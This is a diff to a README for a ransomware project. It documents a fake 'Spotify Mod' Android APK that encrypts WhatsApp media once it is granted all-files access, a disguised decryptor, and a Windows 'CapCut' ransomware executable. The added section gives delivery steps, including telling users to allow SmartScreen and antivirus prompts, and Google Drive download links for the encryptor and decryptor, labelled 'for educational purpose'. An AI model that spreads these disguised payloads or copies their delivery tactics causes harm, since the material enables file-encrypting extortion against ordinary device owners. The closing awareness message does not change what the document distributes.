@@ -746,4 +746,162 @@ This cross-platform ransomware project utilizes several Dart, Flutter, and syste
 | Deleted Originals | Like Android, original files are removed post-encryption |
 | Console Output (Optional) | If enabled, success/failure messages shown via command-line or pop-up logs |
 
-# Screenshots
+# Screenshots Of Application
+### Installation Prompt 
+When the fake **Spotify Mod** APK is sideloaded on an Android device,  
+this installation prompt is shown to the user, mimicking a genuine app installation.
+![Spotify Mod Installation Prompt](./apk%20files%20%20AND%20exe%20Files/SpotifyMod.jpg)
+
+##  Ransomware Execution Flow (Android - Spotify Mod)
+
+The following screenshots demonstrate the execution flow of the **Spotify Mod (Encryptor APK)** on an Android device:
+
+ **All Files Access Permission Request**  
+The app requests full storage access, which allows it to read, modify, and delete all files without explicit user knowledge.
+
+**Encryption Process Triggered on Launch**  
+Once permissions are granted, the encryption process begins automatically with a simple "Encrypting..." status shown on screen.
+
+ **Encryption Completed Confirmation**  
+Upon successful encryption of target files, the app displays a completion message.
+Give Access Allow Permission
+![Ransomware Execution Flow](./apk%20files%20%20AND%20exe%20Files/RansomwareExecutionFlow.jpg)
+
+> _This flow simulates how ransomware operates silently after gaining permissions._
+
+##  Encrypted Files Example in Internal Storage
+
+After the encryption process completes, the targeted files inside  
+`/storage/emulated/0/WhatsApp/Media/WhatsApp Profile Photos/`  
+appear like this in the file manager:
+
+![Encrypted Files Example](./apk%20files%20%20AND%20exe%20Files/Encrypted_Files.jpg)
+
+ **Key Observations:**
+- Original files are replaced with `.enc` extension (e.g., `.jpg.enc`, `.pdf.enc`)
+- Files become unreadable by the system or any app
+- Files include random names or obfuscated file names
+- Encryption timestamp matches execution time
+
+> _This demonstrates how the ransomware successfully encrypts sensitive files in target directories._
+##  Spotify Decryptor Installation Prompt
+
+When the user tries to install the **Spotify Decryptor APK** (Disguised Decryption Tool), the following installation prompt appears:
+
+![Spotify Decryptor Installation Prompt](./apk%20files%20%20AND%20exe%20Files/Spotify%20Decryptor%20Installation%20Prompt.jpg)
+
+
+ This APK is disguised as a file recovery tool but actually decrypts files encrypted by the ransomware.
+
+> _The installation prompt mimics legitimate app installations to avoid suspicion._
+##  Spotify Decryptor Permission and Decryption Flow
+
+Below is the flow of **Spotify Decryptor APK** execution after installation:
+
+ **Permission Grant Screen**  
+The app requests **Manage All Files Access** permission to access storage for decryption.
+
+ **Decryption Progress Screen**  
+Once launched, the app displays _"Decryption will start..."_ indicating background decryption process.
+
+3 **Decryption Completed Screen**  
+After successful decryption, a confirmation message _" Decryption Completed!"_ is shown.
+
+![Spotify Decryptor Execution Flow](./apk%20files%20%20AND%20exe%20Files/Spotify%20Decryptor%20Execution%20Flow.jpg)
+
+
+
+> _This simulation demonstrates how attackers can silently decrypt files once the correct key and permissions are granted._
+##  Post-Decryption File View (Restored WhatsApp Profile Photos)
+
+After the **Spotify Decryptor APK** successfully completes decryption, the previously encrypted files are restored back to their original readable format with their original file extensions (e.g., `.jpg`, `.pdf`, `.mp3`).  
+This confirms the working of the decryptor tool.
+
+ **Restored Files Location:**
+```
+/storage/emulated/0/Android/media/com.whatsapp/Profile Photos/
+```
+
+ Screenshot:  
+![Post-Decryption Files](./apk%20files%20%20AND%20exe%20Files/Post-Decryption%20Files.jpg)
+
+> _This showcases the successful recovery of encrypted files by the decryptor module._
+
+ #  Windows Ransomware & Decryptor Execution Flow
+
+##  Packaging & Delivery
+
+| Step | Action |
+|---|---|
+| 1️⃣ | Download the ZIP file from the link provided |
+| 2️⃣ | Extract the ZIP — it contains the disguised executable |
+| 3️⃣ | Double-click the EXE file to execute |
+| 4️⃣ | Allow any permission prompt (SmartScreen/Antivirus) |
+| 5️⃣ | The ransomware runs silently and encrypts target files |
+| 6️⃣ | Encrypted files will have `.encrypted` extension |
+| 7️⃣ | To decrypt, download the **Decryptor ZIP**, extract, and run the EXE |
+
+---
+
+## 🔗 Download Links (For Educational Purpose Only)
+
+| Tool | Download Link |
+|---|---|
+|  **CapCut Ransomware (Encryptor)** | [Download CapCut.zip](https://drive.google.com/file/d/1ttsT83lxNLEGj0K17n89GG1gEwUsDSG9/view?usp=sharing) |
+|  **CapCut Decryptor** | [Decoder.zip](https://drive.google.com/file/d/1BfBja7iJMMrR5MB-TqhhJJhEfQH1Mt4D/view?usp=sharing)
+
+---
+
+# Windows Ransomware  (Step-by-Step with Screenshots)
+
+###  ZIP File Preview in Google Drive  
+![ZIP Preview Screenshot](./apk%20files%20%20AND%20exe%20Files/ZIPPreviewScreenshot.jpg)
+
+
+---
+
+### Downloaded ZIP & Extracted `.exe` File  
+![Running the EXE](./apk%20files%20%20AND%20exe%20Files/Running%20the%20EXE%20.png)
+
+
+
+---
+
+### Running the EXE (Permission Prompt Example)  
+![SmartScreen Prompt](./apk%20files%20%20AND%20exe%20Files/SmartScreenPromptScreenshot.png)
+
+---
+
+### Post-Encryption Folder with `.encrypted` Files  
+![Post Encryption Files](./apk%20files%20%20AND%20exe%20Files/PostEncryptionFilesScreenshot.png)
+
+---
+
+### Decryptor ZIP Extraction & Execution  
+![Decryptor EXE Screenshot](./apk%20files%20%20AND%20exe%20Files/DecryptorEXEScreenshot.png)
+
+
+---
+
+###  Post-Decryption Folder with Restored Files  
+![Decryptor EXE Screenshot](./apk%20files%20%20AND%20exe%20Files/Decryptor%20EXE%20Screenshot.png)
+
+
+---
+
+##  Working Summary
+
+| Operation | Result |
+|---|---|
+| Encryption | Silent AES-256 encryption on specified folder |
+| File Extension | `.encrypted` |
+| Decryption | Same password & algorithm used to restore original files |
+
+---
+
+<h2 style="color:red;">⚠ SOCIAL AWARENESS MESSAGE</h2>
+
+**The primary objective of this project is to spread awareness about social media risks and cybercrime.**  
+This project demonstrates **how dangerous ransomware can be**, as it infiltrates devices, encrypts files, and demands a hefty ransom for decryption.  
+**Our intention is to educate people about how cybercriminals misuse such techniques to extort money from victims.**  
+**Stay alert, stay safe — and always take proper steps to protect your devices and data.**
